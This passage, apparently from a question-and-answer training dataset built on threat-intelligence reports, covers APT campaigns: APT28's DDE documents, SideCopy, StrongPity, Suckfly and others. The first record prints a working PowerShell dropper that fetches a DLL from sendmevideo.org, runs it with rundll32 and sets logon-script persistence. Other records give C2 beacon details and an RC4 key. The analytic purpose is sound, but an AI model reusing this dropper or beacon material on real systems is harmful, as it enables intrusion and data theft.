ab354807e687993fbeb1b325eb6e4ab38d428a1e\nCompile date: 2017-10-30 23:53:02\nControl server: satellitedeluxpanorama[.]com. (This domain uses the same name servers as above.)\nThe preceding sample most likely belongs to the same campaign. Based on our analysis it uses the same techniques and payload. We can clearly establish that the campaign involving documents using DDE techniques began on October 25.\nThe domain satellitedeluxpanorama[.]com, used by the implant secnt.dll, resolved to 89.34.111.160 as of November 5. The malicious document 68c2809560c7623d2307d8797691abf3eafe319a is responsible for dropping the Seduploader payload (secnt.dll). Its original file name was SaberGuardian2017.docx. This document was created on October 27. The document is distributed from\nhxxp://sendmevideo[.]org/SaberGuardian2017.docx. The document calls sendmevideo[.]org/dh2025e/eh.dll to download Seduploader (ab354807e687993fbeb1b325eb6e4ab38d428a1e).\nThe PowerShell command embedded in this document:\n$W=New-Object System.Net.WebClient;\n$p=($Env:ALLUSERSPROFILE+\"\\mvdrt.dll\");\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};\n$W.DownloadFile(\"http://sendmevideo.org/dh2025e/eh.dll\",$p);\nif (Test-Path $p){\n$rd_p=$Env:SYSTEMROOT+\"\\System32\\rundll32.exe\";\n$p_a=$p+\",#1\u2033;\n$pr=Start-Process $rd_p -ArgumentList $p_a;\n$p_bat=($Env:ALLUSERSPROFILE+\"\\mvdrt.bat\");\n$text='set inst_pck = \"%ALLUSERSPROFILE%\\mvdrt.dll\"'+\"`r`n\"+'if NOT exist %inst_pck % (exit)'+\"`r`n\"+'start rundll32.exe %inst_pck %,#1'\n[io.File]::WriteAllText($p_bat,$text)\nNew-Item -Path 'HKCU:\\Environment' -Force | Out-Null;\nNew-ItemProperty -Path 'HKCU:\\Environment' -Name 'UserInitMprLogonScript' -Value \"$p_bat\" -PropertyType String -Force | Out-Null;\n}\nThe file vms.dll, 4bc722a9b0492a50bd86a1341f02c74c0d773db7, is 99% similar-to secnt.dll ab354807e687993fbeb1b325eb6e4ab38d428a1e, indicating the code is almost identical and highly likely to be part of the same campaign. These two DLL implants are likely part of the same campaign. Furthermore, the sample 4bc722a9b0492a50bd86a1341f02c74c0d773db7, based on our code analysis, is 99% similar to the DLL implant 8a68f26d01372114f660e32ac4c9117e5d0577f1, which was used in a campaign spoofing the upcoming cyber conference .\nThe attack techniques in the two campaigns differ: The campaign spoofing the Cy Con U.S conference used document files to execute a malicious VBA script; this campaign using the terrorist theme uses DDE within a document file to execute PowerShell and fetches a remote payload from a distribution site. The payloads, however, are identical for both campaigns.\nQuestion: What are the key indicators that suggest the malicious document 'IsisAttackInNewYork.docx' and the Seduploader payload are part of the same campaign, and how do these indicators help in identifying similar future attacks?",
    "output": "Answer: Key indicators suggesting that 'IsisAttackInNewYork.docx' and the Seduploader payload are part of the same campaign include the use of the same DDE technique, similar PowerShell commands, and the download of nearly identical DLL files (vms.dll and secnt.dll) from related domains. The domains used for control servers (webviewres[.]net and satellitedeluxpanorama[.]com) share the same name servers (ns1.njal.la and ns2.njal.la), further linking them. These indicators help in identifying similar future attacks by providing patterns in techniques, payloads, and infrastructure that can be monitored and flagged by security systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the DarkComet RAT's DDoS capabilities relate to Network Denial of Service attacks?",
    "output": "Network Denial of Service (DoS) attacks aim to degrade or block the availability of targeted resources to users by exhausting the network bandwidth services rely on. In the context of the DarkComet RAT, its DDoS capabilities can be used to perform Network DoS attacks. Specifically, DarkComet supports three types of DDoS attacks: HTTP flooding, UDP flooding, and TCP flooding. However, the HTTP flood implementation has two catastrophic bugs, rendering it ineffective as an application layer attack. Instead, it reduces to a volumetric TCP flood against port 80, which is a form of Network DoS attack. The use of botnets, such as DarkComet, can amplify the impact of Network DoS attacks, making them more challenging to defend against. Furthermore, the use of IP address spoofing, as mentioned in the Network DoS description, can also be applied to DarkComet's DDoS attacks, making it more difficult to trace back the attacking systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: CREDENTIAL HARVESTING\nOne of SideCopy's central motives is credential harvesting. Specifically, the group looks to steal access credentials from central Indian government employees.\nThe group commonly targets Kavach, an MFA app used across India's government. Kavach allows employees (including military personnel) to access IT resources such as email services.\nSideCopy has shown a particular interest in Kavach, deploying the njRAT malware with special victim IDs of \"kavach.\" They also use GoLang-based file recon plugins (Nodachi) to exfiltrate Kavach authentication databases from infected devices. Some droppers for MargulasRAT also masqueraded as installers for Kavach on Windows.\nWe've also discovered phishing portals operated by SideCopy posing as the GoI's webmail to trick victims into divulging their email credentials (Figure 38).\nBig Headline: CONCLUSION\nWhat started as a simple infection vector by SideCopy to deliver a custom RAT (CetaRAT), has evolved into multiple variants of infection chains delivering several RATs. The use of these many infection techniques \u2014 ranging from LNK files to self-extracting RAR EXEs and MSI-based installers \u2014 is an indication that the actor is aggressively working to infect their victims. This threat actor is also rapidly evolving their malware set using a combination of custom and commodity RATs and plugins. The variety of post-infection plugins specifically used by the attacker signifies a focus on espionage.\nTargeting tactics used by SideCopy consists of multiple themes, quite similar to those utilized by APT36: military, diplomatic and honeytraps. This indicates that the group continues to target government entities in the Indian subcontinent.\nThis boost in SideCopy's operations aided by multiple infection chains, RATs and plugins marks the group's intent to rapidly evolve their TTPs.\nBig Headline: COVERAGE\nWays our customers can detect and block this threat are listed below.\nCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here.\nCisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks.\nCisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free here.\nCisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat.\nCisco Secure Network/Cloud Analytics (Stealthwatch/ Stealthwatch Cloud) analyzes network traffic automatically and alerts users of potentially unwanted activity on every connected device.\nCisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.\nUmbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here.\nCisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them.\nAdditional protections with context to your specific environment and threat data are available from the Firewall Management Center.\nCisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network.\nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. SIDs 57842 - 57849 can protect against the threats outlined in this paper.\nCisco Secure Endpoint users can use Orbital Advanced Search to run complex OSqueries to see if their endpoints are infected with this specific threat.\n\nWhy does SideCopy focus on targeting the Kavach MFA app, and what specific techniques do they employ to achieve credential harvesting?",
    "output": "SideCopy focuses on targeting the Kavach MFA app because it is widely used by central Indian government employees, including military personnel, to access IT resources such as email services. By targeting Kavach, SideCopy aims to steal access credentials from these high-value targets. The group employs several techniques for credential harvesting, including deploying the njRAT malware with special victim IDs of 'kavach,' using GoLang-based file recon plugins (Nodachi) to exfiltrate Kavach authentication databases from infected devices, and creating phishing portals that pose as the Government of India's webmail to trick victims into divulging their email credentials.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Profiting from the Product\nSo who is most likely to profit from the information being gathered through these attacks? The political, economic and intelligence reporting has a clear audience, but deciding who the commercial intelligence should be passed to presents a more taxing problem. Which companies receive this kind of assistance? The answer may lie in the particular brand of capitalism which China practices.\nChina is no longer the planned economy it once was and some Chinese companies are now among the largest in the world. But this is not capitalism as we know it and these companies are far from being truly 'private'. All the largest companies in China are State Owned Enterprises (SOEs) in which the state is the largest (or only) shareholder. The state can and does change company board members at will and members of the armed forces are routinely brought into senior management roles. But in addition to simply appointing the heads of companies, the Party also has a final say over the strategic direction of each company, business planning processes and the size of salaries paid to employees. After all, if companies are seen to be profiting unfairly at the expense of the workers that could lead to political unrest.\nThere are currently 117 companies classed as SOEs and under the control of the State-owned Assets Supervision and Administration Commission (SASAC), the primary shareholder in these companies. To give some idea of the scale of SOEs, they now comprise 80% of the value of China's stock market. Yet in the last 10 years, the number of SOEs has almost halved as SASAC has pushed through mergers of companies with similar strengths to consolidate the overall power of these companies in various sectors and make them more competitive outside China. SASAC works alongside the Communist Party's Organisation Department, which acts as a human resources department and makes certain that those running these businesses care every bit as much (if not more) about pleasing Party bosses as they do about their success in business.\nIn addition to the Party's input to the strategies pursued by these companies, the state is also instrumental in guiding them to financial success by other means. Most significantly it arranges cheap lines of credit, allowing companies to borrow money for expansion; and provides a ready-made market for the company \u2013 the Party has the ability to block competitors from any industry or to introduce policies which make competitors more expensive. The state can also provide considerable human resources if a particular company or industry needs to increase production suddenly: large pools of labour in China work for the state rather than companies and so form a mobile and flexible workforce. But if at the end of the day the products or services a company offers are outdated or of poor quality, that company will fail. The Party has a vested interest in every SOE performing well\nand becoming a national or global champion in its sector, so it may be willing to extend help through the leveraging of intelligence sources. Note the list of companies and sectors in Appendix A: it is clear that the companies on the list all have interests in areas which will support the Five Year Plan and Indigenous Innovation.\nMedium Headline: Hypothetical Case Study: Aircraft Construction\nOne good example of how the Party could use its intelligence collection methods to benefit an SOE is seen in the case of COMAC16 , the Commercial Aircraft Corporation of China. COMAC is currently trying to build a large aircraft to compete with the likes of Boeing and Airbus. In an excellent in-depth paper on Indigenous Innovation17 , the US Chamber of Commerce and strategic consulting firm ACPO Worldwide18 detail the desire of China to build an aircraft since the crash (and subsequent re-engineering) of a Pakistan Airlines Boeing 707 in 1971. The re-engineered plane named the Yun-10 was a complete failure as China did not at that time possess all the necessary technology required to make it a success.\nWith a rise in the use of air transport within China, domestic carriers are being forced to buy foreign aircraft at enormous cost, whereas a home-grown aircraft could be sold much more cheaply. The COMAC C91919 is designed to rival the Boeing 737 and Airbus A320 and planned to be operating by 2015, and to encourage foreign companies to share their technology, China has promised access to the market. Companies including Parker Aerospace, General Electric, Honeywell and Goodrich have all signed up. Whether they benefit from this move in the long term, or are instead encouraged to leave once they have been bled dry of useful information, remains to be seen. But for all the help they are getting, Chinese engineers are not yet able to access the technology developed by Boeing and Airbus, or by large aeroplane engine suppliers such as Rolls Royce.\nWe know therefore that there is intent to build a domestic airliner and that previously re-engineering has been attempted. Technology transfer is ongoing at the moment, but how (hypothetically) could computer network exploitation attacks help China achieve its goal?\nIt is hard to imagine that a project of that size would not be given some assistance by the government, given that there is national pride at stake. If intelligence or military resources could be directed against Boeing and Airbus networks there would be some very quick wins. Not only could design documents and technical information be stolen en masse and without the need to actually deal with the company, but there could be some weak links in the supply chains of these companies which would help an attacker to penetrate their networks.\nFirst, smaller suppliers would provide an easy target from where attacks could be launched directly, spoofing emails with Trojans to improve the chance of recipients opening them. Second, both companies have facilities in China, presumably with network connectivity which may provide a direct route into the main network. There are also Chinese citizens working for the two target organisations who could be tasked to download something nefarious or plug in a USB drive to help their country.\n16\n17\n18\n19\nFinally all large organisations share large amounts of their data with third parties such as law firms and consultants; companies that may not protect their networks as effectively as the target company. These 'data aggregators' can present a major vulnerability in the security of sensitive data.\nThe end goal of the project is to sell the aircraft worldwide and to undercut the established suppliers. COMAC could achieve this by using lines of credit at favourable rates from the Chinese banks that would help to make deals cheaper for airlines purchasing aircraft. But what really helps these companies undercut foreign rivals is that they have not needed to spend huge amounts of money on R&D to get the plane off the ground in the first place.\nIf designs for the body of the aircraft could be stolen along with aerodynamic information it would cut development time by years; and by billions of dollars. If stolen engine designs were also used that would cut costs further still. Even if the companies from whom this technology had been stolen were able to see that it had been stolen, they would only be able to take limited action in response; and to do so could put at risk their continued ability to operate or sell in China.\nThe list of SOEs in \"Appendix A\" is dominated by transport companies (rail, aerospace and shipping), energy (petrochemical, nuclear, power generation/distribution, hydro), telecoms (mobile, infrastructure), manufacturing, extraction/metals (coal, iron, steel, minerals, aluminium) and trading companies. If a company has been targeted by Chinese state sponsored cyber espionage, we believe that any information stolen probably ends up in one of these SOEs. While China is able to manipulate market conditions in various ways to help SOEs prosper, nothing would contribute more to their growth and success than a supply of inside information about the activities of their competitors and customers.\nRead the text above and answer this question: How might the strategic use of stolen information help COMAC undercut established aircraft manufacturers like Boeing and Airbus?",
    "output": "Stolen information, such as designs for aircraft bodies and engines, could significantly reduce development time and costs for COMAC. By avoiding the need for extensive R&D, COMAC could save years and billions of dollars. Additionally, favorable lines of credit from Chinese banks could make deals cheaper for airlines purchasing COMAC aircraft. This combination of reduced costs and financial incentives would allow COMAC to undercut established competitors like Boeing and Airbus, making their aircraft more attractive to potential buyers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Pallas malware handle exfiltrated data from compromised Android devices? Describe the structure and processing of the exfiltrated data.",
    "output": "Pallas handles exfiltrated data server-side via the upload.php script, which accepts HTTP POST requests with specific headers and structures. When Pallas receives the GALL1 instruction, it uploads exfiltrated data as a zip archive or saves it as a .db file. For most .db files, each line is base64 encoded and prepended with the string '*#@'. When decoded, each line translates to a piece of exfiltrated data associated with a content keyword or data type. The structure of the exfiltrated data can be represented as '<DataType><separator>[<field><separator>...<field><separator>]'. Analysis of known Pallas samples has identified 10 different data types, including contact information, call logs, text messages, and Wi-Fi scan results.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Summer 2016 Watering Hole Victim Geolocations \u2013 WinRAR and TrueCrypt\nOver the course of a little over a week, malware delivered from winrar.it appeared on over 600 systems throughout Europe and Northern Africa/Middle East. Likely, many more infections actually occurred. Accordingly, the country with the overwhelming number of detections was in Italy followed by Belgium and Algeria. The top countries with StrongPity malware from the winrar.it site from May 25th through the first few days of June are Italy, Belgium, Algeria, Cote D'Ivoire, Morroco, France, and Tunisia.\nMedium Headline: winrar[.]it StrongPity component geolocation distribution\nIn a similar time-span, the over sixty visitors redirected from winrar.be to ralrab.com for malicious file download were overwhelmingly located in one country. The top countries directed to StrongPity malware from the winrar.be site from May 25th through the first few days of June are Belgium, Algeria, Morroco, Netherlands, Canada, Cote D'Ivoire, and Tunisia.\nwinrar[.]be StrongPity component geolocation distribution StrongPity previously set up TrueCrypt themed watering holes in late 2015. But their offensive activity surged in late summer 2016. The group set up a site directly pulled from the contents of the legitimate TrueCrypt website. From mid July to early September, dozens of visitors were redirected from tamindir[.]com to true-crypt[.]com with unsurprisingly almost all of the focus on systems in Turkey, with victims in the Netherlands as well.\ntamindir[.]com to true-crypt[.]com poisoned TrueCrypt installer redirects\nBig Headline: StrongPity Malware\nThe StrongPity droppers were often signed with unusual digital certificates, dropping multiple components that not only provide complete control of the victim system, but effectively steal disk contents, and can download components for further collection of various communications and contacts. Because we are talking about StrongPity watering holes, let's take a quick look at what is being delivered by the group from these sites.\nWhen we count all systems from 2016 infected with any one of the StrongPity components or a dropper, we see a more expansive picture. This data includes over 1,000 systems infected with a StrongPity component. The top five countries include Italy, Turkey, Belgium, Algeria, and France.\nIn the case of the\nwinrar[.]be/ralrab[.]com watering hole malware, each one of the six droppers that we observed created a similar set of dropped components on disk. And, in these cases, the attackers did not re-use their fake digital certificates. In addition to installing the legitimate version of WinRAR, the dropper installed the following StrongPity components:\n%temp%\\procexp.exe\n%temp%\\sega\\\nnvvscv.exe\nprst.cab\nprst.dll\nwndplyr.exe\nwrlck.cab\nwrlck.dll\nOf these files, two are configurable and encrypted with the same keyless cipher, \"wrlck.cab\" and \"prst.cab\". While one maintains several callback c2 for the backdoor to fetch more instructions and upload installed software and file paths, the other maintains something a bit more unusual. \"prst.cab\" maintains an encrypted list of programs that maintain encrypted connections. This simple encoding takes the most significant nibble for each character, swaps the nibbles of that byte, and xors the result against the original value. Its code looks something like this:\nx = s[i];\nj = ((x & 0xF0)>>4);\ny = x ^ j;\nUsing that cipher in the ralrab[.]com malware, the package is configured to seek out several crypto-enabled\nsoftware applications, highlighting the group's interest in users of more encryption-supported software suites.\nputty.exe (a windows SSH client)\nfilezilla.exe (supports ftps uploads)\nwinscp.exe (a windows secure copy application, providing encrypted and secure file transfer)\nmstsc.exe (Windows Remote Desktop client, providing an encrypted connection to remote systems)\nmRemoteNG.exe (a remote connections manager supporting SSH, RDP, and other encrypted protocols)\nAlso included in StrongPity components are keyloggers and additional data stealers.\nBig Headline: Conclusion\nWidely available, strong cryptography software tools help provide secure and private communications that are now easily obtained and usable. In the summer of 2016, multiple encryption-enabled software applications were targeted with watering hole, social engineering tactics, and spyware by the StrongPity APT. While watering holes and poisoned installers are tactics that have been effectively used by other APT, we have never seen the same focus on cryptographic-enabled software. When visiting sites and downloading encryption-enabled software, it has become necessary to verify the validity of the distribution site and the integrity of the downloaded file itself. Download sites not using PGP or strong digital code signing certificates need to re-examine the necessity of doing so for their own customers. We have seen other APT such as Crouching Yeti and Darkhotel distribute poisoned installers and poisoned executable code, then redistribute them through similar tactics and over p2p networks. Hopefully, simpler verification systems than the current batch of PGP and SSL applications will arise to be adopted in larger numbers. Until then, strong anti-malware and dynamic whitelisting solutions will be more necessary than ever.\nMore information about the StrongPity APT group is available to customers of (<http://www.kaspersky.com/business-security/entrp/apt>)Kaspersky Intelligent Services. Contact: (<mailto:intelreports@kaspersky.com>)intelreports@kaspersky.com\nQ: Why did the StrongPity APT focus on targeting users of encryption-enabled software applications, and what measures can be taken to mitigate such attacks in the future?",
    "output": "The StrongPity APT focused on targeting users of encryption-enabled software applications because these tools provide secure and private communications, making them high-value targets for espionage. By compromising these tools, the attackers could gain access to sensitive information. To mitigate such attacks in the future, it is essential to verify the validity of distribution sites and the integrity of downloaded files. Download sites should use PGP or strong digital code signing certificates. Additionally, adopting simpler verification systems and implementing strong anti-malware and dynamic whitelisting solutions can help protect against these types of threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Conclusion\nThe observation of a moderately sized cross-section of cyber events within the oil and gas industry clearly indicates that there is ongoing cyber conflict. This conflict exists in the form of espionage and sabotage, and it involves both state and non-state actors. In the case of cyber espionage, these actors are advanced in the sense that they have launched multi-year campaigns which have gone undetected as they have exflitrated what is likely untold billions of dollars in intellectual property. There tactics represent a formalization and ritualization of the conflict which will suggests that it has been weaponized and will continue to escalate in the future. The Chinese government is absolutely involved in some capacity, and stands to gain the most out if these transactions. China will need to continue to make aggressive moves to sustain its need for oil going forward as its ability to meet growing demand becomes overwhelmed. Red October, while largely targeted at diplomatic entities, also targeted the oil and gas industry. The sophistication of the infrastructure used in Red October, as well as the methods, suggest a revolution in the type of cyber conflict that will be seen in the oil and gas industry. A majority of these groups are still active as of April 2013, even after being outed in reports released by antivirus and incident response companies over the last few years. These reports themselves represent one aspect in which non-state actors will become ever more important in cyber conflict, particularly within important industries such as oil and gas. American companies are particularly vulnerable targets to state-backed or state-owned foreign competitors who may in the future leverage their countries' cyber forces to gain competitive advantage, or possible develop their own.\nThis type of competitiveness may lead to the types of sabotage exchanges seen in the Middle East. These attacks may either have been the work of nation-states battling out policy in the cyber realm, or unconnected events with the Shamoon attacks merely being a disaffected hacktivist group expressing dissent. Regardless of origin, these exchanges are clear examples of cyber conflict of a destructive nature. Going forward, the sophistication of the viruses used in these attacks will likely only increase. Attacks like the flame and Stuxnet viruses may be seen by American companies within the industry. The line between espionage and sabotage attacks can be somewhat blurred with viruses being modular and having the capability to perform both; gathering intel while waiting undetected to unleash a more sinister capability. The very use of these types of malware breeds and intimacy and familiarity with them that allows for their further proliferation by the parties who were previously attacked. Even if they cannot reverse engineer them, they may understand the behaviors well enough to crudely mimic them.\nAs discussed at the beginning of the paper, cyber conflict is attractive. It is attractive to criminal elements, corporate elements, individuals, hacktivists, state actors, and other sundry non-state actors alike. Because of its low barrier to entry, availability, and outsized impact, the oil industry must prepare for sustained future conflict in this realm.\nBig Headline: Appendix A - Definitions\nAdvanced Persistent Threat: An advanced persistent threat (APT) uses multiple phases to break into a network, avoid detection, and harvest valuable information over the long term. These phases are Incursion, Discovery, Capture, and Exfiltration according to Symantec.86\nAnonymous: A decentralized group of individuals who label themselves as \"hactivists.\" The individuals are a non-state sponsored group. The group frequently picks their targets based on current events or decisions of companies that conflict with an ever changing mantra of the group. The attacks perpetrated by Anonymous are frequently not complex in nature and often are designed just to restrict access to public websites through a denial of service attack.\nC2: Command and Control\nCyber Warfare: \"Actions by a nation-state to penetrate another nation's computers or networks for the purposes of causing damage or disruption. \"87\nDropper virus: A type of Trojan that serves to transport and extract a viral payload onto the destination system. The dropper is frequently made to masquerade as an innocuous executable that once executed the viral payload has been deployed. The dropper service at this point no longer needs to be running. 88\nExfiltration: The opposite of infiltrate. The act of secretly stealing information from the enemy's control. It is a form of espionage.\nMalware: A generic term used to describe software designed to cause malicious actions on a computer system. Trojans, Viruses, and Worms are examples of types of Malware.\nReflexive control: \"A means of conveying to a partner or an opponent specially prepared information to incline him to voluntarily make the predetermined decision desired by the initiator of the action.\"89\nSCADA: Supervisory control and data acquisition are a type of industrial control system usually deployed to monitor systems over long distances.\nSpear phishing: The process of attempting, often through email, to acquire someone else's user information. This is achieved through social engineering and often involves sending emails that appear to be from a known and trusted individual.\nTrojan: A type of computer malware that does not replicate, rather its primary function is to allow unauthorized access to the computer systems, steal information, or cause harm to the infected system. A Trojan often presents itself as an innocuous file thus tricking the user into executing.\nVirus: A type of computer malware that is able to self-replicate and infect multiple systems. The replication is usually tied to a human interaction.\n86  http://www.symantec.com/theme.jsp?themeid=apt-infographic-1\n87 Clarke, R A and Knake, R K (2010). CyberWar, the next threat to national security and what to do about it. New York: Ecco/HarperCollins.\n88  Symantec. (2012, April 26). Trojan.Dropper. Retrieved March 9, 2013, from Symantec: http://www.symantec.com/security_response/writeup.jsp?docid=2002-082718-3007-99\n89  Thomas, T. (2011). Recasting the Red Star. Fort Leavenworth: Foreign Military Studies Office.\nAnswer this question: How does the involvement of the Chinese government in cyber espionage within the oil and gas industry impact the future of cyber conflict? Why might China continue to engage in such activities?",
    "output": "The involvement of the Chinese government in cyber espionage within the oil and gas industry indicates a strategic effort to gain intellectual property and maintain its oil supply. China is likely to continue these activities due to its growing demand for oil and the need to sustain its economic growth. The formalization and ritualization of these campaigns suggest that cyber conflict will escalate, with China making aggressive moves to secure its interests. This ongoing conflict highlights the importance of preparing for sustained future cyber warfare in the oil and gas industry.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Suck\u00d3y attack lifecycle\nOne of the attacks we investigated provided detailed insight into how Suck\u00d3y conducts its operations. In 2015, Suck\u00d3y conducted a multistage attack between April 22 and May 4 against an e-commerce organization based in India. Similar to its other attacks, Suck\u00d3y used the Nidiran back door along with a number of hacktools to infect the victim's internal hosts. The tools and malware used in this breach (<http://www.symantec.com/connect/blogs/keeping-your-code-signing-certificate-straight-and-narrow>)were also signed with stolen digital certi\u00d2cates (http://www.symantec.com/connect/blogs/keeping-your-code-signing-certi\u00d2cate-straight-and-narrow). During this time the following events took place:\n1. Suck\u00d3y's \u00d2rst step was to identify a user to target so the attackers could attempt their initial breach into the e-commerce company's internal network. We don't have hard evidence of how Suck\u00d3y obtained information on the targeted user, but we did \u00d2nd a large open-source presence on the initial target. The target's job function, corporate email address, information on work related projects, and publicly accessible personal blog could all be freely found online.\n2. On April 22, 2015, Suck\u00d3y exploited a vulnerability on the targeted employee's operating system (Windows) that allowed the attackers to bypass the User Account Control and install the Nidiran back door to provide access for their attack. While we know the attackers used a custom dropper to install the back door, we do not know the delivery vector. Based on the amount of open-source information available on the target, it is feasible that a spear-phishing email may have been used.\n3. After the attackers successfully exploited the employee's system, they gained access to the e-commerce company's internal network. We found evidence that Suck\u00d3y used hacktools to move latterly and escalate privileges. To do this the attackers used a signed credential-dumping tool to obtain the victim's account credentials. With the account credentials, the attackers were able to access the victim's account and navigate the internal corporate network as though they were the employee.\n4. On April 27, the attackers scanned the corporate internal network for hosts with ports 8080, 5900,\nand 40 open. Ports 8080 and 5900 are common ports used with legitimate protocols, but can be abused by attackers when they are not secured. It isn't clear why the attackers scanned for hosts with port 40 open because there isn't a common protocol assigned to this port. Based on Suck\u00d3y scanning for common ports, it's clear that the group was looking to expand its foothold on the e-commerce company's internal network.\n5. The attackers' \u00d2nal step was to ex\u00d2ltrate data o\u00d7 the victim's network and onto Suck\u00d3y's infrastructure. While we know that the attackers used the Nidiran back door to steal information about the compromised organization, we do not know if Suck\u00d3y was successful in stealing other information.\nThese steps were taken over a 13-day period, but only on speci\u00d2c days. While tracking what days of the week Suck\u00d3y used its hacktools, we discovered that the group was only active Monday through Friday. There was no activity from the group on weekends. We were able to determine this because the attackers' hacktools are command line driven and can provide insight into when the operators are behind keyboards actively working. Figure 4 shows the attackers' activity levels throughout the week.\nSmall Headline: Suck\u00d3y's command and control infrastructure\nSuck\u00d3y made its malware di\u00d5cult to analyze to prevent their operations from being detected.\nHowever, we were able to successfully analyze Suck\u00d3y malware samples and extract some of the\ncommunications between the Nidiran back door and the Suck\u00d3y command and control (C&C) domains.\nWe analyzed the dropper, which is an executable that contains the following three \u00d2les:\n1. dllhost.exe: The main host for the .dll \u00d2le\n2. iviewers.dll: Used to load encrypted payloads and then decrypt them\n3. ms\u00d3ed: The encrypted payload\nAll three \u00d2les are required for the malware to run correctly. Once the malware has been executed, it checks to see if it has a connection to the internet before running. If the connection test is successful, the malware runs and attempts to communicate with the C&C domain over ports 443 and 8443. In the samples we analyzed we found the port and C&C information encrypted and hardcoded into the Nidiran malware itself. The Nidiran back door made the following initial communication request to the Suck\u00d3y C&C domain:\nGET /gte_ok0/logon.php HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, de\u00d3ate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR\n1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\nHost: REDACTED\nConnection: Keep-Alive\nCookie:\ndfe6=OIAXUNXWn9CBmFBqtwEEPLzwRGmbMoNR7C0nLcHYa+C1tb4fp7ydcZSmVZ1c4akergWcQQ==\nThe interesting information being transmitted to the C&C server in the initial request is located in the cookie which is comprised of the following:\n[COOKIE NAME]=[RC4 ENCRYPTED + B64 ENCODED DATA FROM VICTIM]\nThe key for the RC4 encryption in this sample is the hardcoded string \"h0le\". Once the cookie data is decoded, Suck\u00d3y has the network name, hostname, IP address, and the victim's operating system information.\nInformation about the C&C infrastructure identi\u00d2ed in our analysis of Suck\u00d3y activity can be seen in Table 1.\nDomain\nRegistration\nIP address\nRegistration date\nSmall Headline: Conclusion\nSuck\u00d3y targeted one of India's largest e-commerce companies, a major Indian shipping company, one of India's largest \u00d2nancial organizations, and an IT \u00d2rm that provides support for India's largest stock exchange. All of these targets are large corporations that play a major role in India's economy. By targeting all of these organizations together, Suck\u00d3y could have had a much larger impact on India and its economy. While we don't know the motivations behind the attacks, the targeted commercial organizations, along with the targeted government organizations, may point in this direction.\nSuck\u00d3y has the resources to develop malware, purchase infrastructure, and conduct targeted attacks for years while staying o\u00d7 the radar of security organizations. During this time they were able to steal digital certi\u00d2cates from South Korean companies and launch attacks against Indian and Saudi Arabian government organizations. There is no evidence that Suck\u00d3y gained any bene\u00d2ts from attacking the government organizations, but someone else may have bene\u00d2ted from these attacks.\nThe nature of the Suck\u00d3y attacks suggests that it is unlikely that the threat group orchestrated these attacks on their own. We believe that Suck\u00d3y will continue to target organizations in India and similar organizations in other countries in order to provide economic insight to the organization behind Suck\u00d3y's operations.\n\nHow did Suck\u00d3y's malware communicate with its command and control (C&C) infrastructure, and what information was transmitted in the initial request?",
    "output": "A: Suck\u00d3y's malware communicated with its C&C infrastructure over ports 443 and 8443. The initial communication request to the C&C domain included a GET request to '/gte_ok0/logon.php'. The interesting information transmitted to the C&C server was contained in a cookie, which was RC4 encrypted and Base64 encoded. The cookie data included the network name, hostname, IP address, and the victim's operating system information. The key for the RC4 encryption was the hardcoded string 'h0le'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the Dukes APT group utilize the CVE-2013-0641 vulnerability in their MiniDuke campaigns, and what does this reveal about their operational tactics?",
    "output": "CVE-2013-0641 is a buffer overflow vulnerability in Adobe Reader and Acrobat that allows remote attackers to execute arbitrary code via a crafted PDF document. In February 2013, the Dukes APT group exploited this vulnerability in their MiniDuke campaigns, which involved spreading malware through spear-phishing emails with malicious PDF attachments. Notably, the MiniDuke samples were compiled on February 20, 2013, after the exploit was already publicly known. However, the presence of PDB strings in the MiniDuke exploits suggests that the components were compiled independently from those described by FireEye, ruling out the possibility that the Dukes simply copied the exploit binaries. This indicates that the Dukes were either confident in their own abilities, willing to take risks, or had invested heavily in the campaigns. The use of CVE-2013-0641 in the MiniDuke campaigns highlights the Dukes' willingness to operate under heightened scrutiny and their ability to adapt and evolve their tactics.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
